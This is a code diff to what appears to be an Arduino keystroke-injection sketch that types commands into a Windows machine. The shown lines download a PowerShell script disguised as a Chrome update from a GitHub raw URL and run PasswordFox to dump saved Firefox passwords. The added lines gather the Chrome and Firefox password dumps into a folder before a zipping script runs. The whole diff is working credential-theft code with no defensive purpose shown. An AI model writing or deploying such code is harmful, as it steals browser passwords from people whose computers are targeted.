@@ -27,6 +27,9 @@ void setup() {
   Keyboard.print("cd / & mkdir chrome & cd chrome");
   typeKey(KEY_RETURN);
   delay(100);
+  Keyboard.print("mkdir Password");
+  typeKey(KEY_RETURN);
+  delay(100);
   Keyboard.print("echo (wget 'https://raw.githubusercontent.com/abdulaziesmuslim/TA/master/ChromeUpdateDownload.ps1' -OutFile ChromeUpdateDownload.ps1) > b.ps1");
   typeKey(KEY_RETURN);
   delay(100);
@@ -42,6 +45,9 @@ void setup() {
   Keyboard.print("PasswordFox.exe /stext PasswordFox.txt");
   typeKey(KEY_RETURN);
   delay(1000);
+  Keyboard.print("for %I in (ChromePass.txt PasswordFox.txt) do copy %I c:\\chrome\\Password");
+  typeKey(KEY_RETURN);
+  delay(100);
   Keyboard.print("powershell ./zipping.ps1");
   typeKey(KEY_RETURN);
   delay(100);
